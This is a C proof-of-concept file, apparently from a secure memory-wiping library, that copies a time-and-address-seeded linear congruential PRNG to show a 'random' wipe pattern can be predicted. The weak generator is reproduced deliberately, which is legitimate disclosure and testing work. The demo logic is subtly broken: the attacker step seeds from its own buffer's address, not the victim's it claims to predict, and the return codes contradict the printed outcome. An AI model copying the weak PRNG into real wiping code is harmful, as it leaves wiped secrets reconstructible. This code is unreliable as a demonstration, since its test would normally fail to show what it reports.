/**
 * @file poc_predictable_wipe.c
 * @brief Proof-of-concept for predictable "random" wipe pattern.
 *
 * This PoC demonstrates that the fallback PRNG in rp_wipe_fill_random
 * is predictable. An attacker who can predict the seed (time + address)
 * can determine the "random" wipe pattern.
 */

#include "rampart.h"
#include "internal/rp_wipe.h"
#include <stdio.h>
#include <string.h>
#include <time.h>

/*
 * This is a copy of the weak PRNG fallback from src/rp_wipe.c.
 * It is included here to create a deterministic test case.
 */
static void vulnerable_fill_random(void *ptr, size_t size, time_t seed_time) {
    volatile unsigned char *p = (volatile unsigned char *)ptr;
    size_t i;
    unsigned long state;

    state = (unsigned long)(size_t)ptr ^ (unsigned long)seed_time;

    for (i = 0; i < size; i++) {
        state = state * 1103515245UL + 12345UL;
        p[i] = (unsigned char)((state >> 16) & 0xFF);
    }
}

void print_buffer(const char* label, const unsigned char* buf, size_t len) {
    size_t i;
    printf("%s: ", label);
    for (i = 0; i < len; i++) {
        printf("%02x", buf[i]);
    }
    printf("\n");
}

int main() {
    unsigned char victim_buffer[64];
    unsigned char attacker_buffer[64];
    time_t prediction_time;

    printf("PoC: Predictable 'Random' Wipe Pattern\n");
    printf("--------------------------------------\n");

    // 1. Victim has data in a buffer.
    memset(victim_buffer, 'A', sizeof(victim_buffer));
    print_buffer("Victim's original data ", victim_buffer, sizeof(victim_buffer));

    // 2. Victim's buffer is "securely" wiped.
    // We capture the time, which an attacker might be able to predict.
    prediction_time = time(NULL);
    vulnerable_fill_random(victim_buffer, sizeof(victim_buffer), prediction_time);
    print_buffer("Victim's 'wiped' buffer", victim_buffer, sizeof(victim_buffer));


    // 3. Attacker regenerates the wipe pattern.
    printf("\nAttacker is attempting to regenerate the wipe pattern...\n");
    printf("Attacker's prediction for time: %ld\n", (long)prediction_time);
    printf("Attacker's prediction for buffer address: %p\n", (void*)victim_buffer);

    vulnerable_fill_random(attacker_buffer, sizeof(attacker_buffer), prediction_time);
    print_buffer("Attacker's generated pattern", attacker_buffer, sizeof(attacker_buffer));

    // 4. Compare the buffers.
    if (memcmp(victim_buffer, attacker_buffer, sizeof(victim_buffer)) == 0) {
        printf("\nSUCCESS: Attacker successfully regenerated the 'random' wipe pattern.\n");
        return 1; // Return non-zero for failure in test scripts
    } else {
        printf("\nFAILURE: Attacker could not regenerate the wipe pattern.\n");
        return 0;
    }
}
